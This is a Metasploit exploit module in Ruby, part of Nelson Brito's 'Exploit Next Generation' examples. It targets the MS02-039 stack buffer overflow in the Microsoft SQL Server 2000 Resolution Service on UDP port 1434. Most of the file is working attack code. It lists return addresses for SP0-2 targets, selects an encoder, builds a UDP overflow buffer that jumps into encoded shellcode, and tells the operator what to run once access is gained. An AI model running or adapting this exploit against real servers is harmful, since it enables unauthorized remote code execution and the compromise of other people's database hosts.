## 
#  $Id: ms02_039.rb,v 1.10 2011-03-22 14:35:21-03 nbrito Exp $
##

###########################################################################
#        ___________ _______    ________                                  #
#        \_   _____/ \      \  /  _____/     .__         .__              #
#         |    __)_  /   |   \/   \  ___   __|  |___   __|  |             #
#         |        \/    |    \    \_\  \ /__    __/  /__    __/          #
#        /_______  /\____|__  /\______  /    |__|        |__|             #
#                \/         \/        \/                                  #
#                                                                         #
#                 Exploit Next Generation Methodology                     #
#                            Release 6.00                                 #
#                                                                         #
#                 Copyright (c) 2004-2011 Nelson Brito                    #
#                          All Rights Reserved                            #
#                                                                         #
###########################################################################
# Author: Nelson Brito <nbrito@sekure.org>                                #
#                                                                         #
# Copyright (c) 2004-2011 Nelson Brito. All rights reserved worldwide.    #
###########################################################################
# ENG example is free software;  you  may  redistribute and/or  modify it #
# under the terms of the 'GNU General Public License' as published by the #
# Free  Software  Foundation;  Version  2  with  the  clarifications  and #
# exceptions described below.  This guarantees your right to use, modify, #
# and redistribute this software under certain conditions. If you wish to #
# embed ENG technology into  proprietary software,  please,  contact  the #
# author for an alternative license (contact nbrito@sekure.org).          #
#                                                                         #
# NOTICE: THIS EXPLOIT NEXT GENERATION EXAMPLE IS NOT DISTRIBUTED AS PART #
# OF ANY COMMERCIAL OR PUBLIC TOOL AND IS FREELY AVAILABLE. ALTHOUGH THIS #
# EXAMPLE WAS PORTED TO WORK WITH RAPID7 METASPLOIT FRAMEWORK TO SHOW HOW #
# FLEXIBLE ITS APPROACH AND DEPLOYMENT IS.                                #
#                                                                         #
# This  program  is distributed in the hope that it will  be useful,  but #
# WITHOUT  ANY  WARRANTY;    without   even   the   implied  warranty  of #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.                    #
# Please, refer to GNU General Public License v2.0 for further details at #
# http://www.gnu.org/licenses/gpl-2.0.html,  or  in the  LICENSE document #
# included with ENG.                                                      #
###########################################################################
require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::MSSQL
	
	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'MS02-039: Exploit Next Generation Methodology Example Module',
			'Description'    => 'Microsoft SQL Server 2000 Resolution Service Stack Overflow',
			'Author'         => [ 'Nelson Brito' ],
			'License'        => 'GPLv2',
			'Version'        => '$Revision: 1.10 $',
			'References'     =>
				[
					[ 'BID', '5310' ],
					[ 'CVE', '2002-0649' ],
					[ 'OSVDB', '4578' ],
					[ 'MSB', 'MS02-039' ],
					[ 'MIL', '44' ],
					[ 'URL', 'http://fnstenv.blogspot.com/' ],
					[ 'URL', 'http://www.h2hc.com.br/' ],
					[ 'URL', 'http://www.websecforum.com/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'ENCODER'  => 'x86/shikata_ga_nai',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 512,
					'BadChars' => "\x00\x3a\x0a\x0d\x2f\x5c",
					'StackAdjustment' => -3500,
				},
			'Targets'        => 
				[
					[ 'Microsoft SQL Server and Data Engine 2000 (SP0-2)',
						{
							'Rets'     => [ 0x42b04488, 0x42b08a7c,
									0x42b0c9dc, 0x42b44188,
									0x42b48774, 0x42b4c6d4 ],
							'Wrts'     => [ 0x42af4930, 0x42afb1b7 ],
						},
					],
				],
			'Platform'       => 'win',
			'DisclosureDate' => 'April 10th, 2011',
			'DefaultTarget' => 0))
			
			register_options(
				[
					Opt::RPORT(1434)
				], self.class)
	end
	
	
	def check
		info = mssql_ping
		if (info['ServerName'])
			print_status("SQL Server Information:")
			info.each_pair { |k,v|
				print_status("   #{k + (" " * (15-k.length))} = #{v}")
			}
			return Exploit::CheckCode::Detected
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		
		connect_udp
		print_status("Execute 'net start sqlserveragent' once access is obtained");

		clnt_ucast_inst = "\x04" + "MSSQLSERVER"
		udp_sock.put(clnt_ucast_inst)

		x        = rand(target['Rets'].length)
		y        = rand(target['Wrts'][1] - target['Wrts'][0])
		writable = target['Wrts'][0] + y

		jmp_addr = rand(127)
		if jmp_addr < (6+8)
			jmp_addr = (6+8)
		end

		ucast_inst =
			"\x04"                                        + # SQL REQUEST CLNT_UCAST_INST
			rand_text(92, payload_badchars)               + # LONG BUFFER
			rand_text(4, payload_badchars)                + # PADDING [ebp]
			[ target['Rets'][x] ].pack('V')               + # RETURN ADDRESS [ebp+04h]
			Rex::Arch::X86.jmp_short(jmp_addr)            + # RELATIVE 8 BITS JUMP
			rand_text(6, payload_badchars)                + # PADDING JMP
			[ writable ].pack('V')                        + # WRITABLE ADDRESS
			[ writable ].pack('V')                        + # WRITABLE ADDRESS
			rand_text((jmp_addr-(6+8)), payload_badchars) + # PADDING
			payload.encoded                                 # SHELLCODE [JUMP LANDS HERE]

		udp_sock.put(ucast_inst)

		disconnect_udp
		handler
	end

end
